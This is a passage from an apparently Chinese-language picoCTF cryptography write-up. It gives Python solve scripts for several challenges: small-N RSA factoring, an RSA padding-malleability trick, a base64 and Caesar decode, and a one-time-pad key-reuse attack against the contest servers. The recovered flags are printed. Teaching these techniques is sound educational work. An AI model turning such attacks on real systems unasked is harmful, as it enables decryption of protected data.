text"><span class="mord">Public key</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Private key</mtext><mo>=</mo><mo stretchy="false">(</mo><mi>d</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{Private key} = (d, n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord">Private key</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li></ul><p>複習完後，看一下題目的說明。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line">In RSA, a small e value can be problematic, but what about N? Can you decrypt this?</span><br><span class="line">==============================</span><br><span class="line">Decrypt my super sick RSA:</span><br><span class="line">c: 421345306292040663864066688931456845278496274597031632020995583473619804626233684</span><br><span class="line">n: 631371953793368771804570727896887140714495090919073481680274581226742748040342637</span><br><span class="line">e: 65537</span><br></pre></td></tr></table></figure><p>這題的敘述中告訴我們，當 e 太小的時候我們可以使用小公鑰指數攻擊(Low public exponent attack)，而題目要我們思考當 N 太小的時候我們可以如何利用。</p><p>回去看一下 RSA 加密的流程後，我們發現 N 是兩個質數的乘積，而當 N 太小的時候我們就可以暴力破解出兩個 P 跟 Q。這裡我們直接使用 FactorDB 去找 N 的因數，就可以找到 P 和 Q 了。</p><p>而有了 P 和 Q，我們就可以順著 RSA 流程找到明文 M 了，我寫了個 Python 幫我找出明文，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">long2str</span>(<span class="params">long_int: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(long_int).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">421345306292040663864066688931456845278496274597031632020995583473619804626233684</span></span><br><span class="line">n = <span class="number">631371953793368771804570727896887140714495090919073481680274581226742748040342637</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># From Factor db find p and q</span></span><br><span class="line">f = FactorDB(n)</span><br><span class="line">f.connect()</span><br><span class="line">factors = f.get_factor_list()</span><br><span class="line">p = factors[<span class="number">0</span>]</span><br><span class="line">q = factors[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Private key: d = <span class="subst">&#123;d&#125;</span>&quot;</span>)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted message: m = <span class="subst">&#123;long2str(m)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>最後找到的明文會是一個很大的數字，這時候再用 Crypto.Util.number 的 long_to_bytes 並 decode，將其轉為字符串，就可以得到 flag 了。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;sma11_N_n0_g0od_55304594&#125;</span><br></pre></td></tr></table></figure><h2 id="No-padding-no-problem">No padding, no problem</h2><blockquote><p>可以先看過這篇 <a href="https://ithelp.ithome.com.tw/articles/10205727">Day 14:[離散數學]同餘（Mod）是什麼？</a></p></blockquote><p>當我們把題目給的密文拿去解密，他會說<code>Will not decrypt the ciphertext. Try Again</code>。代表題目的這支程式應該是在偵測我們輸入的是否為 Ciphertext。而我們知道</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">Plaintext = c^d \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">Pl</span><span class="mord mathnormal">ain</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8991em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mo>=</mo><mo stretchy="false">(</mo><mi>c</mi><mo>+</mo><mi>n</mi><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c^d \mod n = (c+n)^d \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8991em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1491em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><p>所以我們利用題目給的 c 和 n 相加後，輸入到他的程式會得到:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Here you go: 290275030195850039473456618367455885069965748851278076756743720446703314517401359267322769037469251445384426639837648598397</span><br></pre></td></tr></table></figure><p>接著只要再利用 Crypto 的 long_to_bytes3 方法就可以找到明文，如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;mercury.picoctf.net&quot;</span>, <span class="number">10333</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;n:&quot;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">r.recvuntil(<span class="string">&quot;ciphertext:&quot;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">num = n + c</span><br><span class="line">r.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Here you go:&quot;</span>)</span><br><span class="line">m = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;m4yb3_Th0se_m3s54g3s_4r3_difurrent_1772735&#125;</span><br></pre></td></tr></table></figure><h2 id="interencdec">interencdec</h2><p>題目給了密文 enc_flag，如下。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6YzRNalV3YUcxcWZRPT0nCg==</span><br></pre></td></tr></table></figure><p>因為他最後面的兩個<code>==</code>讓他看起來很像是 base64 的格式，所以就用 base64 先 Decode 一下。這邊用的是<a href="https://gchq.github.io/CyberChef/">CyberChef</a>這款工具，他可以線上進行很多種的編碼解碼、加密等等。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704163439113.png" alt="b64 decode"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzc4MjUwaG1qfQ==</span><br></pre></td></tr></table></figure><p>解碼一次後長這樣，還是很像 base64 的格式，所以我又做了一次 base64 解碼。（注意：這邊要把前面的 b 拿掉，只留引號中的內容）</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704163700571.png" alt="b64 decode"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpjvJAM&#123;jhlzhy_k3jy9wa3k_78250hmj&#125;</span><br></pre></td></tr></table></figure><p>再解碼一次後變成了這樣的形狀，看起來已經有 Flag 的雛型了（因為大括號），所以猜測它是某種置換密碼。就用最普遍的凱薩密碼來暴力解解看吧！Exploit 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = <span class="built_in">input</span>(<span class="string">&quot;Enter the encrypted flag: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">27</span>):</span><br><span class="line">    dec_flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> enc_flag:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            <span class="keyword">if</span> char.isupper():</span><br><span class="line">                dec_flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>) - i) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dec_flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) - i) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dec_flag += char</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;pico&quot;</span> <span class="keyword">in</span> dec_flag.lower():</span><br><span class="line">        <span class="built_in">print</span>(dec_flag)</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;caesar_d3cr9pt3d_78250afc&#125;</span><br></pre></td></tr></table></figure><h2 id="Easy-peasy">Easy peasy</h2><blockquote><p>想了解 OTP 可以去看看這個 <a href="https://zh.wikipedia.org/zh-tw/%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A2%BC%E6%9C%AC">一次性密碼本</a></p></blockquote><p>先看題目。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">******************Welcome to our OTP implementation!******************</span><br><span class="line">This is the encrypted flag!</span><br><span class="line">551e6c4c5e55644b56566d1b5100153d4004026a4b52066b4a5556383d4b0007</span><br><span class="line"></span><br><span class="line">What data would you like to encrypt?</span><br></pre></td></tr></table></figure><p>在這題中，我們要先閱讀他給我們的 Code。在 encrypt 函式中我們可以看到一些事情。因為題目給的 Cipher 的長度為 64，又因為他是以十六進制的方式輸出 Cipher，所以我們可以知道他用掉的<code>key_location</code>長度為 32，也就是說，我們下次在加密的時候是用第 33 位開始的 key。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">key_location</span>):</span><br><span class="line">    ui = <span class="built_in">input</span>(<span class="string">&quot;What data would you like to encrypt? &quot;</span>).rstrip()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ui) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(ui) &gt; KEY_LEN:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    start = key_location  <span class="comment"># 這裡從32開始</span></span><br><span class="line">    stop = key_location + <span class="built_in">len</span>(ui)</span><br><span class="line"></span><br><span class="line">    kf = <span class="built_in">open</span>(KEY_FILE, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> stop &gt;= KEY_LEN:</span><br><span class="line">        stop = stop % KEY_LEN</span><br><span class="line">        key = kf[start:] + kf[:stop]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = kf[start:stop]</span><br><span class="line">    key_location = stop</span><br><span class="line"></span><br><span class="line">    result = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> p, k: <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(p) ^ k), ui, key))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Here ya go!\n&#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;&quot;</span>.join(result)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_location</span><br></pre></td></tr></table></figure><p>知道了我們第一次輸入要加密的銘文是從第 32 個 key 開始後，我們要想辦法可以使用到跟題目一樣的那組 key，而在程式碼的這個區段我們可以發現一些事。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> stop &gt;= KEY_LEN:</span><br><span class="line">        stop = stop % KEY_LEN</span><br><span class="line">        key = kf[start:] + kf[:stop]</span><br></pre></td></tr></table></figure><p>在這邊，如果我們讓<code>stop</code>和<code>KEY_LEN</code>相等，讓<code>stop % KEY_LEN == 0</code>的話，<code>stop</code>就會被設定為 0，所以我們就可以讓 one-time pad 被重複使用了！所以我們先輸入一堆沒用的字元去填充那個區間段，讓他把第一個 50000 循環結束，再進入一次循環後我們就可以得到跟題目一樣的 key 了。</p><p>然後因為他加密的方法是用計算 XOR 的方式，所以我們可以簡單地透過再計算一次 XOR 得到明文，如下:</p><blockquote><p>key \oplus pt = ct$$ $$key \oplus ct = pt$$ $$pt \oplus ct = key</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii  <span class="comment"># binascii.unhexlify() is used to convert hex to binary</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">50000</span> - <span class="number">32</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;mercury.picoctf.net&quot;</span>, <span class="number">11188</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">encrypted_flag = r.recvline().strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypted_flag)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;?&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;A&quot;</span> * offset)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;?&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;A&quot;</span> * <span class="number">32</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">encoded = r.recvline().strip()</span><br><span class="line">encoded = binascii.unhexlify(encoded)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;A&quot;</span> * <span class="number">32</span></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encoded)):</span><br><span class="line">    key.append(<span class="built_in">ord</span>(message[i]) ^ encoded[i])</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line">encrypted_flag = binascii.unhexlify(encrypted_flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_flag)):</span><br><span class="line">    flag.append(<span class="built_in">chr</span>(key[i] ^ encrypted_flag[i]))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="Custom-encryption">Custom encryption</h2><p>這題給了兩個檔案。一個是加密後的 flag，裡面還包含了加密需要的一些變量；另一個是加密腳本。既然給了腳本，那就先來看看 Code 吧。我結合了題目給的加密後的 flag 的資訊，把註解直接寫在了代碼裡面，看看吧！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generator</span>(<span class="params">g, x, p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(g, x) % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文 = 明文的每個字元ASCII碼 * 密鑰 * 311並append到一個list</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> plaintext:</span><br><span class="line">        cipher.append(((<span class="built_in">ord</span>(char) * key * <span class="number">311</span>)))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">p</span>):</span><br><span class="line">    v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, p + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> p % i == <span class="number">0</span>:</span><br><span class="line">            v = v + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamic_xor_encrypt</span>(<span class="params">plaintext, text_key</span>):</span><br><span class="line">    cipher_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    key_length = <span class="built_in">len</span>(text_key)</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext[::-<span class="number">1</span>]):  <span class="comment"># 從明文的末尾開始</span></span><br><span class="line">        key_char = text_key[i % key_length]  <span class="comment"># 循環text_key裡面每個字元</span></span><br><span class="line">        encrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ <span class="built_in">ord</span>(key_char))  <span class="comment"># 對應的密文 = 明文 ^ 密鑰</span></span><br><span class="line">        cipher_text += encrypted_char</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">plain_text, text_key</span>):</span><br><span class="line">    p = <span class="number">97</span></span><br><span class="line">    g = <span class="number">31</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_prime(p) <span class="keyword">and</span> <span class="keyword">not</span> is_prime(g):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Enter prime numbers&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    a = randint(p - <span class="number">10</span>, p)</span><br><span class="line">    b = randint(g - <span class="number">10</span>, g)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># a = 89</span></span><br><span class="line">    <span class="comment"># b = 27</span></span><br><span class="line">    <span class="comment"># p = 97</span></span><br><span class="line">    <span class="comment"># g = 31</span></span><br><span class="line">    u = generator(g, a, p)  <span class="comment"># u = 31 ** 89 % 97 = 49</span></span><br><span class="line">    v = generator(g, b, p)  <span class="comment"># u = 31** 27 % 97 = 85</span></span><br><span class="line">    key = generator(v, a, p)  <span class="comment"># key = 85 ** 89 % 97 = 12</span></span><br><span class="line">    b_key = generator(u, b, p)  <span class="comment"># b_key = 49 ** 27 % 97 = 12</span></span><br><span class="line">    shared_key = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> key == b_key:</span><br><span class="line">        shared_key = key  <span class="comment"># shared_key = 12</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid key&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    semi_cipher = dynamic_xor_encrypt(plain_text, text_key)</span><br><span class="line">    cipher = encrypt(semi_cipher, shared_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;cipher is: <span class="subst">&#123;cipher&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    message = sys.argv[<span class="number">1</span>]</span><br><span class="line">    test(message, <span class="string">&quot;trudeau&quot;</span>)</span><br></pre></td></tr></table></figure><p>由上面的代碼可以知道，它是經過了兩次的加密，一次是把明文反過來並讓其對<code>text_key</code>循環做 XOR，第二次是把第一次加密得到的東西轉 ASCII 並乘以 key 再乘以 311。</p><p>解密的話就反過來，先去除以 311 再除以 key（這裡為 